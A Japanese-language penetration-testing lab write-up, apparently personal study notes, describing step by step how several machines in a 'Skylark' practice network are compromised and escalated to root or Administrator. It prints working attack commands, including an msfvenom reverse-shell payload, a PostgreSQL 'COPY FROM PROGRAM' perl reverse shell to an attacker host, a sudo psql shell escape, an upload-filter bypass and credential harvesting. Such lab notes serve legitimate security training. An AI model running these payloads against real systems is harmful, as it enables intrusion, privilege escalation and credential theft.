途中までしか終わらなかった。

# VM15

1. osCommerce Online Merchant v2.3.4.1を使っていることから、[44374 - Exploit-DB](https://www.exploit-db.com/exploits/44374)を使ってRCEし、内部に親友

2. 0.0.0.0で動作していたFroxlorがあったので、`/froxlor/lib/userdata.inc.php`に保存されているSQLの認証情報を抽出
	- 127.0.0.1で動作していなくても、FWによって遮断されていて内部からならアクセスできるサービスは要注目

3. Froxlorのデータベースにアクセスしたところ、\Froloxlor\Cronというテーブルがあり、その中にCronjobの一覧が保存されていた

4. cronを列挙すると、rootでFroxlorとありパット見は何が実行されているかわからないし確認できないが、ステップ３で確認したCRONテーブルにあった一つの実行可能ファイルを書き換え、root

---

# VM14

1. UDPスキャンの結果、`tftpd`という、認証不要でファイル転送が可能なプロトコルが動作していたので、ファイルを列挙
```sh
nmap -n -Pn -sU -p69 -sV --script tftp-enum $TargetIP
```

2. 入手したファイルに、Umbracoアップグレード用のFTP認証情報や、sipXcomの認証情報を発見


---

# VM18

1. FTPが動作している、かつ、ほかのポートでUmbracoが動作していたため、[Summary - Skylark](#VM14)で入手した認証情報でFTPログインしたところ、以下のような構成であった
```sh
ftp> ls
229 Entering Extended Passive Mode (|||63862|)
150 Starting data transfer.
drwxrwxrwx 1 ftp ftp               0 Nov 30  2022 aspnet_client
-rw-rw-rw- 1 ftp ftp             703 Nov 29  2022 iisstart.htm
-rw-rw-rw- 1 ftp ftp           99710 Nov 29  2022 iisstart.png
-rw-rw-rw- 1 ftp ftp              74 Dec 01  2022 security.txt
drwxrwxrwx 1 ftp ftp               0 Nov 29  2022 umbraco
```

2. iisstart.htm (iisのデフォルトページ) と umbracoの２つがあり、かつ、`/etc/hosts`に以下のように登録してそれぞれFQDNとTLD+1でアクセスしたところ、umbracoとIISに振り分けられたので、バーチャルホストと推定（[👻Gobuster](../Tools/👻Gobuster.md#補足：バーチャルホストとは)）
```sh
192.168.1.20 tokyo07.skylark.com skylark.com
```

3. umbracoは`/bin/Debug/net6.0/publish`があり、Net 6+の比較的新しい環境で動作しており、一方でIISは直でweb rootであったため、ASP.net framework（古い）と推定し、aspx ペイロードをアップ（[WebShell](../Cheatsheet/Common/WebShell.md#ASP%20/%20ASP.NET%20(IIS))）
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.239 LPORT=443 -f aspx -o reverse.aspx
```
```sh
ftp > put reverse.php
ftp > ls
229 Entering Extended Passive Mode (|||63862|)
150 Starting data transfer.
drwxrwxrwx 1 ftp ftp               0 Nov 30  2022 aspnet_client
-rw-rw-rw- 1 ftp ftp             703 Nov 29  2022 iisstart.htm
-rw-rw-rw- 1 ftp ftp           99710 Nov 29  2022 iisstart.png
-rw-rw-rw- 1 ftp ftp              74 Dec 01  2022 security.txt
drwxrwxrwx 1 ftp ftp               0 Nov 29  2022 umbraco
-rw-rw-rw- 1 ftp ftp              74 Dec 01  2022 reverse.php
```

4. 以下のURL（TLD+1：IISの方）でアクセスしたらIISとしてリバースシェル獲得
```
http://skylark.jp:24680/reverse.aspx
```

5. 内部でサービスを列挙したところ、クオテーションに囲まれていないサービスを発見したので、エクスプロイトして権限昇格（[💥Windows Privilege Escalation](../Cheatsheet/🪟Windows/💥Windows%20Privilege%20Escalation.md#Unquoted%20Service%20Pathのエクスプロイト方法)）
```powershell
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* |
  Where-Object {
    $_.ObjectName -and
    $_.ObjectName -notmatch 'LocalService|NetworkService' -and
    $_.ImagePath -and
    $_.ImagePath -notmatch '^"?C:\\Windows\\'
    # unquoted service path用
    # $_.PathName -notmatch '"'
  } |
  Select PSChildName, ImagePath, ObjectName
```

6. Administrator に権限昇格後、C:\Users\j_local\Desktop にpasswords.kdbxがあったため、keepass2johnでクラックし、squidの認証情報を入手
	- **反省**：パスワードのクラックは、fasttrack→rockyouの流れ

---

# VM19

1. VM16でsquidが動作していた、かつ、VM16のWebサービスで172.16のインターフェースを持つことを示唆する出力があったため、FoxyProxyとproxychainsに登録のうえ、内部NW側のインターフェースにアクセスしたところ、sipXcomを発見

2. [Summary - Skylark](#VM14)のTFTPDで発見したsipXcomの認証情報を使いログイン

3. [脆弱性リスト](../Misc/脆弱性リスト.md#SipXcom%20RCE・PE（CVE-2023-25355・CVE-2023-25356）)を使い、権限昇格

---

# VM10

1. VM19にchiselでトンネリングのうえ、VM10にポートスキャンしたところ、telnetがオープン

2. telnetに接続し、rootとするとそのまま権限昇格した

---

# VM17

1. nginxのみしか動作していないように見えて、FeroxBusterでスキャンしたらUploadディレクトリを発見
	- **反省**：FeroxBusterで403を見逃すと、表面上はアクセスできなくても、深いパスであればアクセスできることを見逃す

2. PDFファイルしか受け付けないホワイトリスト型の防御であったため、[⚡️File upload vuln](../../BSCP/Server-side/File%20upload%20vuln/⚡️File%20upload%20vuln.md#Magic%20Number%20フィルタ)でPDFファイルとしてPHPファイルを詐称のうえ、アップロード

3. FeroxBusterでUploadsディレクトリが403になっていたため、`Uploads/<payload>`にアクセスしてリバースシェルをトリガーし、www-data として初期アクセス

4. FeroxBusterでconfig.phpにアクセスできることを確認していたので（ブラウザでは解釈され実行されるので中身は確認できなかった）、ファイルの中身を確認すると`postgres`ユーザーの認証情報を入手した

5. postgres DBユーザーとして接続し、スーパーユーザーであったため、postgres としてコマンドを実行し、postgre の OSユーザーを侵害
```sh
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<Port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

6. postgres が NO PASSWD psql とあったので、GTFOBinsに従い、権限昇格
```sh
# GTFOBinx
psql
\! /bin/sh
```
```sh
# 実際に実行したコマンド
sudo psql -h 127.0.0.1 -U postgres
password for user postgres: # ← www-dataで発見した認証情報
\! /bin/sh
# whoami
root
```

7. rootでWebアプリのUpload ディレクトリにアクセスすると、PDFファイルがあり、そこにRDWeb の認証情報があった

---

# VM13

1. [Summary - Skylark](#VM17)で入手した認証情報でWebサービスに接続し、`.rdp`ファイルをゲット
- ちなみに、nginxでGobusterしても何も出力はされなかったが、[Summary - Skylark](#VM17)のPDFファイルに/RDWebというディレクトリがあることがわかった
```sh
PORT   STATE SERVICE REASON  VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE

443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=austin02.SKYLARK.com
| Not valid before: 2022-11-15T12:30:26
|_Not valid after:  2023-05-17T12:30:26
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|_  http/1.1
```

2. `/etc/hosts`にFQDNを登録のえ、入手した`.rdp` ファイルでアクセス（RDPではなく、"RemoteAPP"の場合は、`.rdp`ファイルを入手し、接続
```sh
xfreerdp <.rdp_file> /d:<domain> /u:<username>
```
- [リモートアプリ VS RDP: どう違う？ - AnyViewer](https://www.anyviewer.com/jp/how-to/remoteapp-vs-rdp-2578.html)

3. ローカルサービスで...（ここで終了）